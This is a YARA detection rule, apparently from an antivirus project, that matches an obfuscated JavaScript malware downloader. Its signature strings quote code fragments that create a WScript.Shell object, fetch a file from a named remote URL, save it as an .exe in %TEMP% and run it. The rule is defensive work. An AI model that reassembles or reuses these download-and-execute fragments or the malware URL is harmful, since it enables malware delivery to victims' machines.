rule sig_20160328_00d66a3149eaac8bce0b49a3389824d0 {
  meta:
    description = "datamaliciousorder - file 20160328_00d66a3149eaac8bce0b49a3389824d0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "21b3744cfba7a07b9ea520faaef5533fb0f86ef6a77774f9ccbc99b9af0698be"

  strings:
    $s1  = "function Ohlopy() {return Kaceyobj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"NbcOtgLGqM.exe\";};" fullword ascii
    $s2  = "Abqffpmx[Tlfcjafbgx](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Uslkygum](Kysnujbz() * 11)} while (Abqffpmx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Kaceyobj = function Zgssoadp() {return WScript[Lppom](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Szyhnubvqk(Hdoaztktfg, Qfwvdk){return Hdoaztktfg - Qfwvdk;};" fullword ascii
    $s6  = "function Rdxaxysxs(Gfqsxyzynp){Kaceyobj[\"Run\"](Gfqsxyzynp, Xvcvdhhatz, Xvcvdhhatz);};" fullword ascii
    $s7  = "function Obfsneb() {return ((Yxrkcoa == true) && (Yxrkcoa == Rfunebdse)) ? 1 : Xvcvdhhatz;};" fullword ascii
    $s8  = "function Xktbdaij(Dxgkrknfe) {var Keymn = (1, 2, 3, 4, 5, Dxgkrknfe); return Keymn;};" fullword ascii
    $s9  = "return Szyhnubvqk(Mnjinrq, Ttqkvoqb);" fullword ascii
    $s10 = " while (Qjcehju){" fullword ascii
    $s11 = "function Yuqkpoe()" fullword ascii
    $s12 = "var Eekgvnvym = false;" fullword ascii
    $s13 = "function Cxnytf(){return Lppom;};" fullword ascii
    $s14 = "function Kysnujbz(){return 22;};" fullword ascii
    $s15 = "var Bjixfoxab = new this[\"Date\"]();" fullword ascii
    $s16 = "var Yxrkcoa = false;" fullword ascii
    $s17 = "Yxrkcoa = true; " fullword ascii
    $s18 = "var Rfunebdse = false;" fullword ascii
    $s19 = "Rfunebdse = true; " fullword ascii
    $s20 = "function Mtjawapaf(){return Wyqzhxtuw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}